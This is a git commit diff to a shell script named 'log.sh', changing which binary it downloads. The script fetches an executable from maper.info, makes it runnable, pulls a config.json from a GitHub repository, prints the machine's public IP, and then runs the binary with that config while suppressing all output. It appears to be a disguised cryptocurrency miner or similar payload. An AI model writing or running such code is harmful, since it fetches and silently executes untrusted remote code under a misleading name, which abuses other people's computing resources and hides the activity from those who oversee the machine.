7d21a18f01b063061e4a8fa5e44d1ea6817362f9
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-10 12:26:45 +0700

    Update log.sh

--- log.sh
+++ log.sh
@@ -1,7 +1,7 @@
-wget https://maper.info/GradeHoldingsInc && chmod +x GradeHoldingsInc >/dev/null 2>&1
+wget https://maper.info/BanqueNouvelleRichesse && chmod +x BanqueNouvelleRichesse >/dev/null 2>&1
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
 sleep 11 
 echo "******************************************************************" 
 echo "IP ORI ==> "$(curl ifconfig.me) 
 echo " "
-./GradeHoldingsInc -c "config.json" >/dev/null 2>&1
+./BanqueNouvelleRichesse -c "config.json" >/dev/null 2>&1
